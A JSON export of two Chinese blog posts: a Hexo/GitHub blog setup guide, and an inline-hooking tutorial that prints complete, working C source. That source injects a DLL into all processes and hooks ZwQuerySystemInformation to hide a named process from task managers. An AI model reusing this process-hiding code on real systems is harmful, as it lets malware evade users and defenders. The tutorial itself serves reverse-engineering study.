[{"id":"f48f1848e82a474528d06090473058c1","title":"GitHub搭建自己的博客","content":"安装Node.js根据自己的电脑安装对应的版本，安装选项全部默认，一路点击Next。\n安装好之后，按Win+R打开命令提示符，输入node -v和npm -v，如果出现版本号，则表示安装成功。\n\n\n\n\n添加国内镜像源或使用cnpm如果没有梯子的话，可以使用阿里的国内镜像进行加速\n1npm config set registry https://registry.npm.taobao.org\n\n或安装淘宝cnpm\n1npm install -g cnpm --registry=https://registry.npm.taobao.org\n\n\n\n安装Hexo首先新建一个文件夹，用来存放自己的博客文件。\n在该目录下右键点击Git Bash Here，打开git的控制台窗口。\n定位到该目录下，输入npm i hexo-cli -g安装Hexo。会有几个报错，无视它就行。\n安装完后输入hexo -v验证是否安装成功。\n然后输入hexo init初始化文件夹，接着输入npm install安装必备的组件。\n这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到博客啦。\n注：①按ctrl+c关闭本地服务器，若无法结束，则打开任务管理器，结束名为Node.js JavaScript Runtime的任务即可。\n② 卸载hexo命令npm uninstall hexo-cli -g。\n连接Github与本地首先右键打开git bash，然后输入下面命令：\n12git config --global user.name &quot;username&quot;git config --global user.email &quot;your email address&quot;\n\n用户名和邮箱根据注册github的信息自行修改。\n配置ssh① 首先在用户主目录下使用如下命令查看SSH keys是否存在\n12ls -al ~/.sshLists the files in your .ssh directory, if they exist\n\n② 若不存在，打开用户主目录，Git Bash Here，使用如下命令创建SSH Key：\n1ssh-keygen -t rsa -C &quot;youremail@example.com&quot;\n\n你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可，由于这个Key也不是用于军事目的，所以也无需设置密码。\n如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。\n\n\n\n\n③  SSH key创建成功后，cd .ssh进入.ssh文件夹，cat id_rsa.pub查看公钥内容\n④ 登陆GitHub，打开“Account settings”，“SSH Keys”页面：\n然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容\n\n\n\n\n更改主题这里以使用Aurora主题为例：\n步骤 1 - 安装主题① 在控制台中，进入 Hexo 项目的根目录，然后运行以下命令安装主题\n1npm install hexo-theme-aurora --save\n\n步骤 2 - 生成主题配置因为主题是使用 NPM 或者 Yarn 安装的，而不是 clone 到 themes 文件夹的。所以需要自己创建一个配置文件。只需要在 Hexo 博客的根目录下创建一个 _config.aurora.yml 配置文件来配置主题。\n获取一个默认的主题配置模版\n\n可以执行以下命令，但是这个命令只能在 Linux 或者 MacOS 下执行，如果你用的是 Windows 系统，可以自行在 node_modules 中找到对应目录复制过来\n\n1cp -rf ./node_modules/hexo-theme-aurora/_config.yml ./_config.aurora.yml\n\n步骤 3 - 设置permalink\n\n\n\n\n\n\n\n\n因为使用了 Vue-router，Hexo 默认生成的页面和文章的 permalink 与 Vue router 中的 path 是不相符的，就会出现无法访问的问题。所以需要修改 Hexo 默认配置文件里面的 permalink 参数。\n#步骤 3.1打开在 Hexo 根目录下的 _config.yml\n#步骤 3.2修改 permalink 参数为 /post/:title.html\n12345678# URL## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;url: https://tridiamond.techpermalink: /post/:title.htmlpermalink_defaults:pretty_urls:  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks\n\n步骤4 - 重新生成与本地服务器\n\n\n\n\n\n\n\n\n使用以下命令来运行本地环境。\n1hexo clean &amp; hexo g &amp; hexo server\n\n提示\n改变了任何配置都需要重新生成 Hexo 的静态文件！\n当文件都生成完毕之后，就可以通过 https://localhost:4000在新窗口打开 访问你的博客了。\n写文章、发布文章首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。\n然后输入hexo new post &quot;article title&quot;，新建一篇文章。\n然后打开D:\\study\\program\\blog\\source\\_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。\n编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。\n注意事项：修改分支由于在_config.yml中设置了提交分支为master，所以需要在GitHub中也进行设置\n仓库首页，默认是main，修改成master\n\n\n\n\nSettings -&gt; Pages -&gt;Source，默认是main，修改成master并Save\n\n\n\n\n配置 _config.yml中有关deploy的部分如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。\n首先，ssh key肯定要配置好。\n其次，配置_config.yml中有关deploy的部分：\n正确写法：\n1234deploy:  type: git  repository: git@github.com:liuxianan/liuxianan.github.io.git  branch: master\n\n错误写法：\n1234deploy:  type: github  repository: https://github.com/liuxianan/liuxianan.github.io.git  branch: master\n\n后面一种写法是hexo2.x的写法，现在已经不行了，无论是哪种写法，此时直接执行hexo d的话一般会报如下错误：\n1Deployer not found: github 或者 Deployer not found: git\n\n原因是还需要安装一个插件：\n1npm install hexo-deployer-git --save\n\n其它命令不确定，部署这个命令一定要用git bash，否则会提示Permission denied (publickey).\n打开你的git bash，输入hexo d就会将本次有改动的代码全部提交，没有改动的不会\n遇到的问题hexo g 时报错 err: Error: Cannot find module ‘truncate-html’\n\n解决办法根据报错安装对应的模块npm install module_name\n参考超详细Hexo+Github博客搭建小白教程\n使用hexo+github搭建免费个人博客详细教程\nGitHub+Hexo 搭建个人网站详细教程\nHexo Aurora中文指南\n","slug":"GitHub搭建自己的博客","date":"2025-03-24T07:31:34.878Z","categories_index":"","tags_index":"搭建博客","author_index":"0netry"},{"id":"ef0903e74e5233a2be57edee3f37a5dc","title":"inline Hook","content":"原理程序在编译链接后成了二进制代码，我们可以找到需要Hook的函数的地址，然后把这个函数在内存中的二进制代码改为一个JMP指令，令其跳转到执行我们自己构造的函数。\n貌似有点难以理解，来看看详细的原理解释：\n函数一般都存在于DLL中，当DLL中某个函数被调用后，其所在的DLL将会被映射到进程地址空间中。我们可以通过DLL这个模块找到我们需要Hook的函数的地址。然后在内存中改变其地址，使跳转到我们制定的位置。比如现在需要Hook 函数CreateFile，这个函数存在于Kernel32.DLL文件中。首先我们必须要知道这个函数在进程中的地址，然后修改这个函数的首地址为JMP MyProc指令。而MyProc函数可以是API函数，也可以是我们自己构造的函数，如果是我们自己构造的函数，那么我们有两种方法把我们的函数注入进目标进程，那就是通过远程线程注入的两种方法。\nIAT钩取通过操作进程的特定IAT值来实现API钩，而inline hook则将API代码的前5个字节修改为JMP XXXXXXXX指令来钩取API。调用执行被钩取的API时，（修改后的）JMP指令就会被执行，转而控制hooking函数。\n\n\n\n\n\n\n\n\n\n顾名思义，API代码修改就是指直接修改映射到目标进程内存空间的系统DLL的代码。\n进程隐藏进程隐藏的相关内容信息已经得到大量公开，其中用户模式下最常用的就是ntdll.ZwQuerySystemInformation() API钩取技术。\n进程隐藏工作原理为了隐藏某个特定进程，要潜入其他所有进程内存，钩取相关API。也就是说，实现进程隐藏的关键不是进程自身，而是其他进程。\n相关API由于进程是内核对象，所以（用户模式下的程序）只要通过相关API就能检测到它们。用户模式下检测进程的相关API通常分为如下两类：\n1.CreateToolhelp32Snapshot()&amp;EnumProcesses()\n123456789101112HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);                                                           //tlhelp32.h                                                           BOOL WINAPI EnumProcesses(    _Out_writes_bytes_(cb) DWORD* lpidProcess,    _In_ DWORD cb,    _Out_ LPDWORD lpcbNeeded);                                                                                                                  //psapi.h\n\n上面两个API均在其内部调用了ntdll.ZwQuerySystemInformation() API\n2.ZwQuerySystemInformation() \n123456NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);\n\n借助ZwQuerySystemInformation() API可以获取运行中的所有进程信息（结构体），形成一个链表。操作该链表（从链表中删除）即可隐藏相关进程。所以在用户模式下不需要分别钩取CreateToolhelp32Snapshot()与EnumProcesses()，只需要钩取ZwQuerySystemInformation()  API就可隐藏指定进程。注意，我们要钩取的目标进程不是要隐藏的进程，而是其他进程。假如要隐藏的进程为test.exe，如果钩取正在运行中的ProcExp.exe（进程查看器或taskmgr.exe任务管理器）进程的ZwQuerySystemInformation() API，那么ProcExp.exe（或taskmgr.exe）就无法查找到test.exe。\n基于Win10的隐藏notepad.exe练习HideProc.exe负责将stealth.dll文件注入所有运行中的进程。stealth.dll负责钩取（注入stealth.dll文件的）进程的ntdll.ZwQuerySystemInformation() API\n1.首先运行notepad.exe（要隐藏的进程）、procexp.exe（钩取对象1）、taskmgr.exe（钩取对象2）\nHideProc.cpp源码分析HideProc.exe负责向运行中的所有进程注入&#x2F;卸载指定的DLL文件。\nWindows Vista&#x2F;7中使用了会话隔离技术，这可能导致DLL注入失败。出现这个问题，不要使用kernel32.CreateRemoteThread()，而使用ntdll.NtCreateThreadEx()就可以了。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;typedef void (*PFN_SetProcName)(LPCTSTR szProcName);enum &#123;INJECTION_MODE = 0, EJECTION_MODE&#125;;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,            // lookup privilege on local system                              lpszPrivilege,   // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tHANDLE                  hProcess, hThread;\tLPVOID                  pRemoteBuf;\tDWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\tLPTHREAD_START_ROUTINE  pThreadProc;\tif ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        printf(&quot;OpenProcess(%d) failed!!!\\n&quot;, dwPID);\t\treturn FALSE;    &#125;\tpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,                                 MEM_COMMIT, PAGE_READWRITE);\tWriteProcessMemory(hProcess, pRemoteBuf,                        (LPVOID)szDllPath, dwBufSize, NULL);\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;LoadLibraryW&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, pRemoteBuf, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tVirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\tCloseHandle(hThread);\tCloseHandle(hProcess);\treturn TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tBOOL                    bMore = FALSE, bFound = FALSE;\tHANDLE                  hSnapshot, hProcess, hThread;\tMODULEENTRY32           me = &#123; sizeof(me) &#125;;\tLPTHREAD_START_ROUTINE  pThreadProc;\tif( INVALID_HANDLE_VALUE ==         (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )\t\treturn FALSE;\tbMore = Module32First(hSnapshot, &amp;me);\tfor( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )\t&#123;\t\tif( !_tcsicmp(me.szModule, szDllPath) ||             !_tcsicmp(me.szExePath, szDllPath) )\t\t&#123;\t\t\tbFound = TRUE;\t\t\tbreak;\t\t&#125;\t&#125;\tif( !bFound )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tif( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;FreeLibrary&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, me.modBaseAddr, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tCloseHandle(hThread);\tCloseHandle(hProcess);\tCloseHandle(hSnapshot);\treturn TRUE;&#125;BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)&#123;\tDWORD                   dwPID = 0;\tHANDLE                  hSnapShot = INVALID_HANDLE_VALUE;\tPROCESSENTRY32          pe;\t//获取系统快照\tpe.dwSize = sizeof( PROCESSENTRY32 );\thSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );\t//查找进程\tProcess32First(hSnapShot, &amp;pe);\tdo\t&#123;\t\tdwPID = pe.th32ProcessID;\t\t//鉴于系统安全性的考虑\t\t//对于PID小于100的系统进程不执行DLL注入操作\t\tif( dwPID &lt; 100 )\t\t\tcontinue;        if( nMode == INJECTION_MODE )\t\t    InjectDll(dwPID, szDllPath);        else            EjectDll(dwPID, szDllPath);\t&#125;\twhile( Process32Next(hSnapShot, &amp;pe) );\tCloseHandle(hSnapShot);\treturn TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    int                     nMode = INJECTION_MODE;    HMODULE                 hLib = NULL;    PFN_SetProcName         SetProcName = NULL;\tif( argc != 4 )\t&#123;\t\tprintf(&quot;\\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;\\               &quot;&lt;process name&gt; &lt;dll path&gt;\\n\\n&quot;);\t\treturn 1;\t&#125;\t// change privilege\t//只有先提升权限，才能准确获取所有进程的列表\t//内部调用AdjustTokenPrivileges来提权    SetPrivilege(SE_DEBUG_NAME, TRUE);    // load library    hLib = LoadLibrary(argv[3]);    // set process name to hide    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, &quot;SetProcName&quot;);    SetProcName(argv[2]);    // Inject(Eject) Dll to all process    if( !_tcsicmp(argv[1], L&quot;-show&quot;) )\t    nMode = EJECTION_MODE;    InjectAllProcess(nMode, argv[3]);    // free library    FreeLibrary(hLib);\treturn 0;&#125;\n\n首先使用 SetPrivilege提升权限，以便获取系统所有进程列表\n接着调用InjectAllProcess，其内部使用CreateToolhelp32Snapshot获取系统中运行的所有进程列表，然后使用Process32First和Process32Next将获取的进程信息存放到PROCESSENTRY32结构体变量pe中，进而获取进程的PID，然后调用InjectDll来注入DLL\n12345678910111213141516171819202122232425262728293031typedef struct tagPROCESSENTRY32W&#123;    DWORD   dwSize;    DWORD   cntUsage;    DWORD   th32ProcessID;          // this process    ULONG_PTR th32DefaultHeapID;    DWORD   th32ModuleID;           // associated exe    DWORD   cntThreads;    DWORD   th32ParentProcessID;    // this process&#x27;s parent process    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads    DWORD   dwFlags;    WCHAR   szExeFile[MAX_PATH];    // Path&#125; PROCESSENTRY32W;typedef PROCESSENTRY32W *  PPROCESSENTRY32W;typedef PROCESSENTRY32W *  LPPROCESSENTRY32W;HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);BOOL WINAPI Process32FirstW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);BOOL WINAPI Process32NextW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);\n\n\n\nstealth.cpp源码分析实际的API钩取操作由stealth.dll文件复制\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define STATUS_SUCCESS\t\t\t\t\t\t(0x00000000L) typedef LONG NTSTATUS;typedef enum _SYSTEM_INFORMATION_CLASS &#123;    SystemBasicInformation = 0,    SystemPerformanceInformation = 2,    SystemTimeOfDayInformation = 3,    SystemProcessInformation = 5,    SystemProcessorPerformanceInformation = 8,    SystemInterruptInformation = 23,    SystemExceptionInformation = 33,    SystemRegistryQuotaInformation = 37,    SystemLookasideInformation = 45&#125; SYSTEM_INFORMATION_CLASS;typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)                 (SYSTEM_INFORMATION_CLASS SystemInformationClass,                   PVOID SystemInformation,                   ULONG SystemInformationLength,                   PULONG ReturnLength);#define DEF_NTDLL                       (&quot;ntdll.dll&quot;)#define DEF_ZWQUERYSYSTEMINFORMATION    (&quot;ZwQuerySystemInformation&quot;)// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()// global variableBYTE g_pOrgBytes[5] = &#123;0,&#125;;BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;#endif\n\nSetProcName()首先看导出函数SetProcName()\n123456789101112131415161718// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()......//export function#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;\n\n以上代码先创建名为”.SHARE”的共享内存节区，然后创建g_szProcName缓冲区，最后再由导出函数SetProcName()将要隐藏的进程名称保存到g_szProcName中（SetProcName函数在HideProc.exe中被调用执行）\n\n\n\n\n\n\n\n\n\n在共享内存节区创建g_szProcName缓冲区的好处在于，stealth.dll被注入所有进程时，可以彼此共享隐藏进程的名称（随着程序不断改进，甚至也可以做到动态修改隐藏进程）\nDllMain()1234567891011121314151617181920212223242526272829BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;\n\nDllMain函数先比较字符串，若进程名为HookProc.exe，则进行异常处理，不钩取API。发生DLL_PROCESS_ATTACH事件时，调用hook_by_code函数钩取API；发生DLL_PROCESS_DETACH事件时，调用unhook_by_code函数取消API钩取。\nhook_by_code()该函数通过修改代码实现API钩取\n12345678910111213141516171819202122232425262728293031323334BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;\n\nIDA反编译结果：\n12345678910111213141516171819202122int __cdecl sub_10001000(LPCSTR lpModuleName, LPCSTR lpProcName, int a3, int a4)&#123;  HMODULE ModuleHandleA; // eax  FARPROC ProcAddress; // esi  DWORD flOldProtect; // [esp+8h] [ebp-10h] BYREF  _DWORD v8[2]; // [esp+Ch] [ebp-Ch]  v8[0] = &#x27;\\xE9&#x27;;  LOBYTE(v8[1]) = 0;  ModuleHandleA = GetModuleHandleA(lpModuleName);  ProcAddress = GetProcAddress(ModuleHandleA, lpProcName);  if ( *(_BYTE *)ProcAddress == 0xE9 )    return 0;  VirtualProtect(ProcAddress, 5u, 0x40u, &amp;flOldProtect);  *(_DWORD *)a4 = *(_DWORD *)ProcAddress;  *(_BYTE *)(a4 + 4) = *((_BYTE *)ProcAddress + 4);  *(_DWORD *)((char *)v8 + 1) = a3 - (_DWORD)ProcAddress - 5;  *(_DWORD *)ProcAddress = v8[0];  *((_BYTE *)ProcAddress + 4) = (unsigned int)(a3 - (_DWORD)ProcAddress - 5) &gt;&gt; 24;  VirtualProtect(ProcAddress, 5u, flOldProtect, &amp;flOldProtect);  return 1;&#125;\n\nhook_by_code()函数参数介绍如下：\n1234567LPCSTR szDllName：[IN]包含要钩取的API的DLL文件的名称LPCSTR szFuncName：[IN]包含要钩取的API名称PROC pfnNew：[IN]用户提供的钩取函数地址PBYTE pOrgBytes：[OUT]存储原来5个字节的缓冲区，后面脱钩时使用\n\n该函数用于将原来API代码的前5个字节更改为”JMP XXXXXXXX”。\n根据Intel x86（IA-32）指令格式，JMP指令对应的操作码为E9，后面跟4个字节的地址。也就是说，JMP指令的Instruction实际形式为”E9 XXXXXXXX”。需要注意的是，XXXXXXXX地址值不是要跳转的绝对地址值，而是从当前JMP命令到跳转位置的相对距离。通过下列关系式求得XXXXXXXX的地址值：\n1XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）\n\n最后又减去5个字节是因为JMP指令本身长度就是5个字节。例如，当前JMP指令的地址为402000，若想跳转到401000地址处，写成”E9 00401000”是不对的，XXXXXXXX地址值要使用上面的等式换算才行。\nXXXXXXXX&#x3D;401000-402000-5&#x3D;FFFFFFFB\n所以JMP指令的Instruction为”E9 FFFFFFFB”\n\n\n\n\n\n\n\n\n\n除了JMP指令外，还有一种short 